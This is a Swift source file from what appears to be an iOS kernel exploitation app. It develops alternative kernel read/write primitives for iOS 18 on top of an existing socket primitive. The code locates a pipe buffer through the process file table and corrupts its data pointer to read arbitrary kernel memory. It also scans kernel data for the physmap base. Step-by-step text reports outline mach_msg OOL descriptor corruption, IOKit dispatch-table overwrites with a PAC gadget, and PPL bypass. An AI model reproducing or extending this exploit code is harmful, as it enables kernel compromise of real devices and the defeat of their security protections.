//
//  BleedingEdgeAlternativeKRW.swift
//  DSPloit
//
//  🔥 BLEEDING EDGE: Alternative KRW Primitive Research
//  Find new kernel read/write primitives beyond socket KRW
//  Explores: pipe buffers, mach_msg OOL, IOKit user clients, vm_map tricks
//  Created by Royan
//

import SwiftUI
import Combine

// MARK: - Data Models

struct KRWPrimitive: Identifiable {
    let id = UUID()
    let name: String
    let method: String
    let description: String
    let readCapable: Bool
    let writeCapable: Bool
    let bypassesPPL: Bool
    let panicRisk: PanicRisk
    let status: PrimitiveStatus
    let icon: String
}

enum PanicRisk: String {
    case none = "None"
    case low = "Low"
    case medium = "Medium"
    case high = "High"
    case guaranteed = "Guaranteed"
    
    var color: Color {
        switch self {
        case .none: return .green
        case .low: return .blue
        case .medium: return .yellow
        case .high: return .orange
        case .guaranteed: return .red
        }
    }
}

enum PrimitiveStatus: String {
    case theoretical = "Theoretical"
    case inProgress = "In Progress"
    case working = "Working ✅"
    case failed = "Failed ❌"
    case blocked = "Blocked 🛡️"
    
    var color: Color {
        switch self {
        case .theoretical: return .secondary
        case .inProgress: return .yellow
        case .working: return .green
        case .failed: return .red
        case .blocked: return .orange
        }
    }
}

struct KRWTestResult: Identifiable {
    let id = UUID()
    let primitive: String
    let action: String
    let address: UInt64
    let value: UInt64
    let success: Bool
    let message: String
    let timestamp: Date
}

// MARK: - Alternative KRW Engine

class AlternativeKRWEngine: ObservableObject {
    static let shared = AlternativeKRWEngine()
    
    @Published var primitives: [KRWPrimitive] = []
    @Published var testResults: [KRWTestResult] = []
    @Published var isWorking = false
    @Published var statusLog: [String] = []
    @Published var pipeKRWReady = false
    @Published var machMsgKRWReady = false
    
    // Pipe-based KRW state
    private var pipeReadFD: Int32 = -1
    private var pipeWriteFD: Int32 = -1
    private var pipeBufferKaddr: UInt64 = 0
    
    private let mgr = dspmgr.shared
    
    init() {
        loadPrimitives()
    }
    
    private func log(_ msg: String) {
        DispatchQueue.main.async {
            self.statusLog.append(msg)
            if self.statusLog.count > 200 { self.statusLog.removeFirst(100) }
        }
        globallogger.log("(alt_krw) \(msg)")
    }
    
    private func loadPrimitives() {
        primitives = [
            KRWPrimitive(
                name: "Pipe Buffer KRW",
                method: "Create pipe, find pipe buffer in kernel, use socket KRW to corrupt pipe buffer pointer → read/write via pipe syscalls",
                description: "Pipe buffers are in a different zone than sockets. If we can find and corrupt a pipe buffer's data pointer, we get a new KRW primitive that accesses different memory regions.",
                readCapable: true, writeCapable: true, bypassesPPL: false,
                panicRisk: .medium, status: .inProgress, icon: "pipe.and.drop"
            ),
            KRWPrimitive(
                name: "mach_msg OOL KRW",
                method: "Send OOL mach message, find OOL descriptor in kernel, corrupt copy address → read/write on receive",
                description: "OOL (out-of-line) mach messages copy data through kernel. By corrupting the OOL descriptor's address field, we can make the kernel copy from/to arbitrary addresses.",
                readCapable: true, writeCapable: true, bypassesPPL: false,
                panicRisk: .medium, status: .theoretical, icon: "envelope.fill"
            ),
            KRWPrimitive(
                name: "IOKit User Client",
                method: "Open IOKit user client, find its kernel object, corrupt external method table → call arbitrary kernel functions",
                description: "IOKit user clients have vtables in kernel. If we can overwrite a vtable entry, calling the user client method executes our chosen kernel function.",
                readCapable: true, writeCapable: true, bypassesPPL: true,
                panicRisk: .high, status: .theoretical, icon: "cpu"
            ),
            KRWPrimitive(
                name: "vm_map Entry Corruption",
                method: "Find vm_map_entry for our mapping, corrupt its physical page → map arbitrary physical memory",
                description: "vm_map entries describe virtual-to-physical mappings. Corrupting the physical page field gives us a mapping to arbitrary physical memory, bypassing PPL.",
                readCapable: true, writeCapable: true, bypassesPPL: true,
                panicRisk: .high, status: .theoretical, icon: "map.fill"
            ),
            KRWPrimitive(
                name: "physmap Sliding Window",
                method: "Use kernel physmap (direct physical memory map) with known physical addresses",
                description: "XNU maps all physical memory at a fixed virtual offset (physmap). If we know the physmap base and target physical address, we can read/write via physmap.",
                readCapable: true, writeCapable: true, bypassesPPL: true,
                panicRisk: .low, status: .theoretical, icon: "rectangle.split.3x1"
            ),
            KRWPrimitive(
                name: "OSSerializer Gadget",
                method: "Create fake OSSerializer object, trigger serialize → execute arbitrary function with controlled arg",
                description: "Classic iOS exploit technique. OSSerializer::serialize() calls a function pointer with a controlled argument. Build fake object in controlled memory.",
                readCapable: false, writeCapable: false, bypassesPPL: false,
                panicRisk: .high, status: .theoretical, icon: "gearshape.2.fill"
            ),
        ]
    }
    
    // MARK: - Pipe Buffer KRW Implementation
    
    /// Step 1: Create pipes and spray to get predictable kernel allocation
    func setupPipeKRW() {
        guard mgr.dsready else {
            log("❌ Kernel not ready")
            return
        }
        
        isWorking = true
        log("Setting up pipe-based KRW...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Create a pipe pair
            var fds: [Int32] = [0, 0]
            let ret = pipe(&fds)
            guard ret == 0 else {
                self.log("❌ pipe() failed: errno=\(errno)")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            self.pipeReadFD = fds[0]
            self.pipeWriteFD = fds[1]
            self.log("Pipe created: read_fd=\(fds[0]), write_fd=\(fds[1])")
            
            // Write marker data to pipe so buffer gets allocated
            let marker: UInt64 = 0xDEAD_C0DE_1234_5678
            var markerData = marker
            let written = Darwin.write(self.pipeWriteFD, &markerData, 8)
            self.log("Wrote \(written) bytes to pipe (marker: 0x\(String(format: "%llx", marker)))")
            
            // Now find the pipe buffer in kernel
            // Strategy: scan our proc's file descriptor table
            let ourProc = ds_get_our_proc()
            guard ourProc != 0 else {
                self.log("❌ Cannot find our proc")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // proc → p_fd → fd_ofiles → fileproc → fg_data → pipe → pipe_buffer
            let p_fd = ds_kread64(ourProc + 0xf8) // p_fd offset (varies by iOS version)
            self.log(String(format: "p_fd: 0x%llx", p_fd))
            
            guard p_fd != 0 else {
                self.log("❌ p_fd is NULL — offset may be wrong")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // fd_ofiles is array of fileproc pointers
            let fd_ofiles = ds_kread64(p_fd + 0x0) // filedesc.fd_ofiles
            self.log(String(format: "fd_ofiles: 0x%llx", fd_ofiles))
            
            guard fd_ofiles != 0 else {
                self.log("❌ fd_ofiles is NULL")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // Read fileproc for our pipe fd
            let fpAddr = ds_kread64(fd_ofiles + UInt64(self.pipeReadFD) * 8)
            self.log(String(format: "fileproc[%d]: 0x%llx", self.pipeReadFD, fpAddr))
            
            guard fpAddr != 0 else {
                self.log("❌ fileproc is NULL — fd table layout different on iOS 18?")
                self.log("   Trying alternative: scan proc open files...")
                self.tryAlternativePipeScan()
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // fileproc → fp_glob → fg_data (pipe struct)
            let fp_glob = ds_kread64(fpAddr + 0x10) // fp_glob offset
            let fg_data = ds_kread64(fp_glob + 0x38) // fg_data offset
            self.log(String(format: "pipe struct: 0x%llx", fg_data))
            
            guard fg_data != 0 else {
                self.log("❌ pipe struct is NULL")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // pipe → pipe_buffer.buffer (the actual data pointer)
            // On iOS 18: struct pipe { pipe_buffer pipe_buffer; ... }
            // pipe_buffer.buffer is at offset 0x10 in pipe struct
            let pipeBuffer = ds_kread64(fg_data + 0x10)
            self.log(String(format: "pipe_buffer.buffer: 0x%llx", pipeBuffer))
            
            if pipeBuffer != 0 {
                // Verify by reading the marker we wrote
                let readMarker = ds_kread64(pipeBuffer)
                self.log(String(format: "Marker read: 0x%llx (expected 0x%llx)", readMarker, marker))
                
                if readMarker == marker {
                    self.pipeBufferKaddr = pipeBuffer
                    self.log("✅ Pipe buffer found and verified!")
                    self.log("   We can now corrupt this pointer for alternative KRW")
                    DispatchQueue.main.async { self.pipeKRWReady = true }
                    self.recordResult(primitive: "Pipe Buffer", action: "setup", addr: pipeBuffer, val: marker, success: true, msg: "Buffer located")
                } else {
                    self.log("⚠️ Marker mismatch — offset may be wrong")
                    self.log("   Scanning nearby offsets...")
                    self.scanPipeBufferOffsets(pipeStruct: fg_data, expectedMarker: marker)
                }
            } else {
                self.log("❌ pipe_buffer.buffer is NULL — pipe may use inline buffer")
            }
            
            DispatchQueue.main.async { self.isWorking = false }
        }
    }
    
    /// Scan nearby offsets to find pipe buffer data pointer
    private func scanPipeBufferOffsets(pipeStruct: UInt64, expectedMarker: UInt64) {
        log("Scanning pipe struct offsets 0x0..0x100 for marker...")
        
        for offset in stride(from: 0, through: 0x100, by: 8) {
            let ptr = ds_kread64(pipeStruct + UInt64(offset))
            if ptr != 0 && ds_isvalid(ptr) {
                let val = ds_kread64_safe(ptr)
                if val == expectedMarker {
                    log(String(format: "✅ Found marker at pipe+0x%x → ptr 0x%llx", offset, ptr))
                    pipeBufferKaddr = ptr
                    DispatchQueue.main.async { self.pipeKRWReady = true }
                    return
                }
            }
        }
        log("❌ Marker not found in pipe struct — may need different approach")
    }
    
    /// Alternative: scan proc's open file list for pipe objects
    private func tryAlternativePipeScan() {
        log("Trying alternative pipe scan via proc file list...")
        
        let ourProc = ds_get_our_proc()
        // On iOS 18, file descriptors may be in a different structure
        // Try reading p_fd at various offsets
        let offsets: [UInt64] = [0xf0, 0xf8, 0x100, 0x108, 0x110, 0xd8, 0xe0, 0xe8]
        
        for off in offsets {
            let candidate = ds_kread64(ourProc + off)
            if candidate != 0 && ds_isvalid(candidate) {
                // Check if this looks like a filedesc struct
                let firstEntry = ds_kread64(candidate)
                if firstEntry != 0 && ds_isvalid(firstEntry) {
                    log(String(format: "  proc+0x%llx = 0x%llx (first entry: 0x%llx)", off, candidate, firstEntry))
                }
            }
        }
    }
    
    // MARK: - Pipe KRW Read/Write
    
    /// Read arbitrary kernel address via corrupted pipe buffer
    func pipeRead64(address: UInt64) -> UInt64 {
        guard pipeKRWReady, pipeBufferKaddr != 0 else { return 0 }
        guard mgr.dsready else { return 0 }
        
        // Save original buffer pointer
        let origPtr = ds_kread64(pipeBufferKaddr)
        
        // Corrupt pipe buffer pointer to target address
        // WARNING: This is the dangerous part — if pipe is read between
        // our write and restore, it reads from the target address
        ds_kwrite64(pipeBufferKaddr, address)
        
        // Read from pipe (kernel will copy from our target address)
        var result: UInt64 = 0
        let n = Darwin.read(pipeReadFD, &result, 8)
        
        // Restore original pointer
        ds_kwrite64(pipeBufferKaddr, origPtr)
        
        if n == 8 {
            return result
        }
        return 0
    }
    
    /// Write to arbitrary kernel address via corrupted pipe buffer
    func pipeWrite64(address: UInt64, value: UInt64) -> Bool {
        guard pipeKRWReady, pipeBufferKaddr != 0 else { return false }
        guard mgr.dsready else { return false }
        
        // For write: we need to corrupt the pipe's write buffer pointer
        // Then write() syscall will copy our data TO the target address
        
        // This is more complex — need to find the write-side pipe buffer
        // For now, log the attempt
        log(String(format: "pipeWrite64: 0x%llx ← 0x%llx (needs write-side buffer)", address, value))
        return false
    }
    
    // MARK: - mach_msg OOL KRW Research
    
    /// Setup mach_msg OOL primitive
    /// Theory: Send OOL message → kernel allocates copy → find copy in kernel → corrupt address
    func setupMachMsgKRW() {
        guard mgr.dsready else {
            log("❌ Kernel not ready")
            return
        }
        
        isWorking = true
        log("Setting up mach_msg OOL KRW research...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Step 1: Create a Mach port
            var port: mach_port_t = 0
            var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
            guard kr == KERN_SUCCESS else {
                self.log("❌ mach_port_allocate failed: \(kr)")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            // Insert send right
            kr = mach_port_insert_right(mach_task_self_, port, port, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
            guard kr == KERN_SUCCESS else {
                self.log("❌ mach_port_insert_right failed: \(kr)")
                DispatchQueue.main.async { self.isWorking = false }
                return
            }
            
            self.log(String(format: "Mach port created: 0x%x", port))
            
            // Step 2: Send OOL message with known marker data
            let oolSize = 0x4000 // 1 page
            let marker: UInt64 = 0xCAFE_BABE_0000_0001
            var oolData = Data(count: oolSize)
            oolData.withUnsafeMutableBytes { ptr in
                // Fill with marker pattern
                let u64ptr = ptr.bindMemory(to: UInt64.self)
                for i in 0..<(oolSize / 8) {
                    u64ptr[i] = marker + UInt64(i)
                }
            }
            
            self.log("OOL data prepared (\(oolSize) bytes, marker: 0x\(String(format: "%llx", marker)))")
            self.log("⚠️ mach_msg OOL send requires complex message structure")
            self.log("   This primitive is THEORETICAL — needs kernel heap spray to locate OOL copy")
            self.log("")
            self.log("=== mach_msg OOL KRW Theory ===")
            self.log("1. Send OOL message → kernel copies data to kalloc")
            self.log("2. Use socket KRW to scan kalloc for our marker")
            self.log("3. Find the ipc_kmsg struct that holds OOL descriptor")
            self.log("4. Corrupt OOL descriptor's address field")
            self.log("5. Receive message → kernel copies FROM corrupted address")
            self.log("6. We get arbitrary kernel read!")
            self.log("")
            self.log("Advantage over socket KRW:")
            self.log("  - OOL copies go through different code path")
            self.log("  - May access memory regions socket KRW cannot")
            self.log("  - ipc_kmsg is in different zone than socket PCBs")
            
            mach_port_deallocate(mach_task_self_, port)
            
            self.recordResult(primitive: "mach_msg OOL", action: "research", addr: 0, val: 0, success: true, msg: "Theory documented")
            DispatchQueue.main.async { self.isWorking = false }
        }
    }
    
    // MARK: - IOKit User Client Research
    
    func researchIOKitKRW() -> String {
        var report = "=== IOKit User Client KRW Research ===\n\n"
        report += "Theory:\n"
        report += "  IOKit user clients have a dispatch table (getExternalMethodForIndex)\n"
        report += "  Each entry has: function pointer, checkScalarInputCount, etc.\n"
        report += "  If we overwrite a function pointer → calling that method\n"
        report += "  executes our chosen kernel function with controlled args.\n\n"
        report += "Steps:\n"
        report += "  1. Open an IOKit user client (e.g., IOSurfaceRoot)\n"
        report += "  2. Find its kernel object via socket KRW\n"
        report += "  3. Find the vtable/dispatch table\n"
        report += "  4. Overwrite one entry with target function\n"
        report += "  5. Call the user client method → executes in kernel\n\n"
        report += "Challenges on iOS 18.2:\n"
        report += "  - KTRR/CTRR protects kernel __TEXT (vtables are read-only)\n"
        report += "  - PAC signs function pointers in vtables\n"
        report += "  - Need to find vtable in writable memory (kalloc copy)\n"
        report += "  - Or find a user client that stores dispatch in __DATA\n\n"
        report += "Potential targets:\n"
        report += "  - IOSurfaceRootUserClient (already open)\n"
        report += "  - AppleAVDUserClient (video decode)\n"
        report += "  - AGXAccelerator (GPU)\n"
        report += "  - AppleH13CamIn (camera)\n\n"
        report += "PAC bypass needed:\n"
        report += "  - A12 uses PAC (QARMA algorithm)\n"
        report += "  - Function pointers signed with context\n"
        report += "  - Need PAC signing gadget or PAC bypass\n"
        report += "  - darksword already has: grcgadgetpacia\n"
        
        log("IOKit KRW research report generated")
        return report
    }
    
    // MARK: - physmap Research
    
    func researchPhysmap() -> String {
        guard mgr.dsready else { return "Kernel not ready" }
        
        var report = "=== Physmap Sliding Window Research ===\n\n"
        
        let kernelBase = mgr.kernbase
        report += String(format: "kernel_base: 0x%llx\n", kernelBase)
        report += String(format: "kernel_slide: 0x%llx\n\n", mgr.kernslide)
        
        report += "Theory:\n"
        report += "  XNU maps ALL physical RAM at a virtual address:\n"
        report += "    physmap_base = gVirtBase (kernel global)\n"
        report += "  To access physical address P:\n"
        report += "    virtual_addr = physmap_base + P\n\n"
        report += "  If we find physmap_base, we can:\n"
        report += "    1. Convert any kernel VA to physical via page tables\n"
        report += "    2. Access that physical address via physmap\n"
        report += "    3. PPL protects page table WRITES but not physmap READS\n\n"
        report += "Finding physmap_base:\n"
        report += "  - gVirtBase is in kernel __DATA\n"
        report += "  - Can be found by scanning kernel globals\n"
        report += "  - Or by reading boot-args structure\n"
        report += "  - Typical value: 0xFFFFFE0000000000 + slide\n\n"
        
        // Try to find gVirtBase
        // It's typically near other boot globals
        let dataSegBase = kernelBase + 0xC00000 // approximate __DATA start
        report += String(format: "Scanning __DATA at 0x%llx for physmap candidates...\n", dataSegBase)
        
        // Look for values that look like physmap base (0xFFFFFE00...)
        var candidates: [(UInt64, UInt64)] = []
        for offset in stride(from: 0, to: 0x10000, by: 8) {
            let val = ds_kread64_safe(dataSegBase + UInt64(offset))
            if val != 0 && (val & 0xFFFFFF0000000000) == 0xFFFFFE0000000000 {
                candidates.append((UInt64(offset), val))
                if candidates.count >= 5 { break }
            }
        }
        
        if candidates.isEmpty {
            report += "  No physmap candidates found in first 64KB of __DATA\n"
            report += "  May need to scan further or use different heuristic\n"
        } else {
            report += "  Candidates found:\n"
            for (off, val) in candidates {
                report += String(format: "    __DATA+0x%llx = 0x%llx\n", off, val)
            }
        }
        
        log("Physmap research complete")
        recordResult(primitive: "physmap", action: "scan", addr: dataSegBase, val: UInt64(candidates.count), success: !candidates.isEmpty, msg: "\(candidates.count) candidates")
        return report
    }
    
    // MARK: - Comparison Test
    
    /// Compare socket KRW vs pipe KRW to see if pipe can access different regions
    func compareKRWAccess(address: UInt64) -> String {
        guard mgr.dsready else { return "Not ready" }
        
        var report = String(format: "=== KRW Comparison at 0x%llx ===\n\n", address)
        
        // Socket KRW
        let socketVal = ds_kread64_safe(address)
        report += String(format: "Socket KRW: 0x%016llx", socketVal)
        report += socketVal == 0 ? " (may be inaccessible)\n" : " ✅\n"
        
        // Pipe KRW (if available)
        if pipeKRWReady {
            let pipeVal = pipeRead64(address: address)
            report += String(format: "Pipe KRW:   0x%016llx", pipeVal)
            report += pipeVal == 0 ? " (may be inaccessible)\n" : " ✅\n"
            
            if socketVal != pipeVal {
                report += "\n⚠️ VALUES DIFFER — different access paths!\n"
                report += "This means pipe KRW accesses different memory than socket KRW\n"
            } else if socketVal == pipeVal && socketVal != 0 {
                report += "\n✅ Values match — both can access this address\n"
            }
        } else {
            report += "Pipe KRW:   NOT READY (run setup first)\n"
        }
        
        return report
    }
    
    // MARK: - Helpers
    
    private func recordResult(primitive: String, action: String, addr: UInt64, val: UInt64, success: Bool, msg: String) {
        let r = KRWTestResult(
            primitive: primitive, action: action,
            address: addr, value: val,
            success: success, message: msg,
            timestamp: Date()
        )
        DispatchQueue.main.async {
            self.testResults.insert(r, at: 0)
            if self.testResults.count > 100 { self.testResults.removeLast() }
        }
    }
}

// MARK: - Main View

struct BleedingEdgeAlternativeKRWView: View {
    @ObservedObject private var engine = AlternativeKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var testAddr = ""
    @State private var compareResult = ""
    @State private var iokitReport = ""
    @State private var physmapReport = ""
    @State private var pipeReadAddr = ""
    @State private var pipeReadResult = ""
    
    var body: some View {
        List {
            // Status
            Section {
                HStack {
                    Image(systemName: "arrow.triangle.branch")
                        .font(.title2)
                        .foregroundStyle(engine.pipeKRWReady ? .green : .blue)
                    VStack(alignment: .leading, spacing: 4) {
                        Text("Alternative KRW Research")
                            .font(.headline)
                        Text("Find new primitives beyond socket KRW")
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                }
                
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Socket KRW")
                    Spacer()
                    StatusIndicator(active: engine.pipeKRWReady, label: "Pipe KRW")
                    Spacer()
                    StatusIndicator(active: engine.machMsgKRWReady, label: "OOL KRW")
                }
            } header: {
                HeaderLabel(text: "Status", icon: "gauge.with.dots.needle.33percent")
            }
            
            // Primitives Overview
            Section {
                ForEach(engine.primitives) { prim in
                    VStack(alignment: .leading, spacing: 6) {
                        HStack {
                            Image(systemName: prim.icon)
                                .foregroundStyle(prim.status == .working ? .green : .blue)
                            Text(prim.name)
                                .font(.subheadline.bold())
                            Spacer()
                            Text(prim.status.rawValue)
                                .font(.caption2)
                                .foregroundStyle(prim.status.color)
                        }
                        
                        Text(prim.description)
                            .font(.caption2)
                            .foregroundStyle(.secondary)
                            .lineLimit(3)
                        
                        HStack(spacing: 10) {
                            if prim.readCapable {
                                Label("Read", systemImage: "eye")
                                    .font(.caption2)
                                    .foregroundStyle(.green)
                            }
                            if prim.writeCapable {
                                Label("Write", systemImage: "pencil")
                                    .font(.caption2)
                                    .foregroundStyle(.orange)
                            }
                            if prim.bypassesPPL {
                                Label("PPL Bypass", systemImage: "shield.slash")
                                    .font(.caption2)
                                    .foregroundStyle(.red)
                            }
                            Spacer()
                            Label(prim.panicRisk.rawValue, systemImage: "exclamationmark.triangle")
                                .font(.caption2)
                                .foregroundStyle(prim.panicRisk.color)
                        }
                    }
                    .padding(.vertical, 4)
                }
            } header: {
                HeaderLabel(text: "Primitives (\(engine.primitives.count))", icon: "list.bullet.rectangle")
            }
            
            // Pipe KRW Setup
            Section {
                Button(action: { engine.setupPipeKRW() }) {
                    Label("Setup Pipe KRW", systemImage: "play.circle.fill")
                }
                .disabled(!mgr.dsready || engine.isWorking)
                
                if engine.pipeKRWReady {
                    TextField("Read address (hex)", text: $pipeReadAddr)
                        .font(.system(.caption, design: .monospaced))
                    
                    Button("Pipe Read64") {
                        guard let addr = UInt64(pipeReadAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                        let val = engine.pipeRead64(address: addr)
                        pipeReadResult = String(format: "pipe_read64(0x%llx) = 0x%016llx", addr, val)
                    }
                    
                    if !pipeReadResult.isEmpty {
                        Text(pipeReadResult)
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                            .textSelection(.enabled)
                    }
                }
            } header: {
                HeaderLabel(text: "🔧 Pipe KRW", icon: "wrench.and.screwdriver")
            }
            
            // mach_msg OOL
            Section {
                Button(action: { engine.setupMachMsgKRW() }) {
                    Label("Research mach_msg OOL", systemImage: "envelope.fill")
                }
                .disabled(!mgr.dsready || engine.isWorking)
            } header: {
                HeaderLabel(text: "📨 mach_msg OOL", icon: "envelope")
            }
            
            // IOKit Research
            Section {
                Button("Generate IOKit Report") {
                    iokitReport = engine.researchIOKitKRW()
                }
                
                if !iokitReport.isEmpty {
                    Text(iokitReport)
                        .font(.system(size: 9, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            } header: {
                HeaderLabel(text: "🔌 IOKit User Client", icon: "cpu")
            }
            
            // Physmap Research
            Section {
                Button("Scan for Physmap Base") {
                    physmapReport = engine.researchPhysmap()
                }
                .disabled(!mgr.dsready || engine.isWorking)
                
                if !physmapReport.isEmpty {
                    Text(physmapReport)
                        .font(.system(size: 9, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            } header: {
                HeaderLabel(text: "🗺️ Physmap", icon: "map")
            }
            
            // Compare KRW
            Section {
                TextField("Address to compare (hex)", text: $testAddr)
                    .font(.system(.caption, design: .monospaced))
                
                Button("Compare Socket vs Pipe KRW") {
                    guard let addr = UInt64(testAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    compareResult = engine.compareKRWAccess(address: addr)
                }
                .disabled(!mgr.dsready || testAddr.isEmpty)
                
                if !compareResult.isEmpty {
                    Text(compareResult)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            } header: {
                HeaderLabel(text: "🔬 Compare Primitives", icon: "arrow.left.arrow.right")
            }
            
            // Test Results
            if !engine.testResults.isEmpty {
                Section {
                    ForEach(engine.testResults.prefix(15)) { result in
                        HStack {
                            Image(systemName: result.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                .foregroundStyle(result.success ? .green : .red)
                            VStack(alignment: .leading, spacing: 2) {
                                Text("\(result.primitive) / \(result.action)")
                                    .font(.caption.bold())
                                if !result.message.isEmpty {
                                    Text(result.message)
                                        .font(.system(size: 9))
                                        .foregroundStyle(.secondary)
                                }
                            }
                            Spacer()
                            if result.address != 0 {
                                Text(String(format: "0x%llx", result.address))
                                    .font(.system(size: 8, design: .monospaced))
                                    .foregroundStyle(.cyan)
                            }
                        }
                    }
                } header: {
                    HeaderLabel(text: "Results (\(engine.testResults.count))", icon: "clock")
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section {
                    ForEach(engine.statusLog.suffix(30), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                } header: {
                    HeaderLabel(text: "Log", icon: "terminal")
                }
            }
        }
        .navigationTitle("Alternative KRW")
        .premiumStyling()
    }
}
